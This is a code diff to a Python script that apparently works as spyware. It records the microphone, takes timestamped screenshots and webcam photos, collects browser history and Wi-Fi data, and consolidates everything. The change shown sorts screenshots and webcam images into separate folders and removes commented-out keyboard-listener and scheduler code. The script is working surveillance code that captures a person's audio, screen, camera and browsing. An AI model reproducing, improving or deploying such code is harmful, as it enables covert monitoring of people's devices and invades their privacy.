@@ -102,15 +102,21 @@ def microphone():
     sd.wait()
     write(file_path + audio_info, fs, myrecording)
 
-# Screenshot Capture
+# Define separate folders for screenshots and webcam images
+screenshots_folder = os.path.join(file_path, "screenshots")  # Folder for screenshots
+webcam_folder = os.path.join(file_path, "webcam_images")  # Folder for webcam images
 
+# Create the folders if they don't exist
+if not os.path.exists(screenshots_folder):
+    os.makedirs(screenshots_folder)
+
+if not os.path.exists(webcam_folder):
+    os.makedirs(webcam_folder)
+
+# Screenshot Capture
 def screenshots():
-    # global screenshot_info
-    # im = ImageGrab.grab()
-    # im.save(file_path + screenshot_info)
-    # screenshot_info +="1"
     timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    screenshot_file = f"screenshot_{timestamp}.png"      # Use timestamp for a unique file name
+    screenshot_file =  f"/screenshots/screenshot_{timestamp}.png"  # Save in the 'screenshots' folder
     im = ImageGrab.grab()
     im.save(file_path + screenshot_file)
 
@@ -121,9 +127,9 @@ def webcam_capture():
     cam = VideoCapture(0)
     result, image = cam.read()
     timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    webcam_shot_info = f"webcam_{timestamp}.png"
+    webcam_shot_file =  f"/webcam_images/webcam_{timestamp}.png" # Save in the 'webcam_images' folder
     if result:
-        imwrite(file_path + webcam_shot_info, image)
+        imwrite(file_path + webcam_shot_file, image)
     cam.release()
     # destroyWindow("webCam")
 
@@ -227,19 +233,6 @@ webcam_capture()
 fetch_browser_history()
 wifi_info_fetch()
 consolidate_data()
-
-
-# def on_release(key):
-#     if key == keyboard.Key.esc:
-#         # Stop listener
-#         return False
-
-# with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-#     listener.join()
-
-# while True:
-#     schedule.run_pending()
-#     time.sleep(1) 
 
 def run_scheduled_tasks():
     while True:
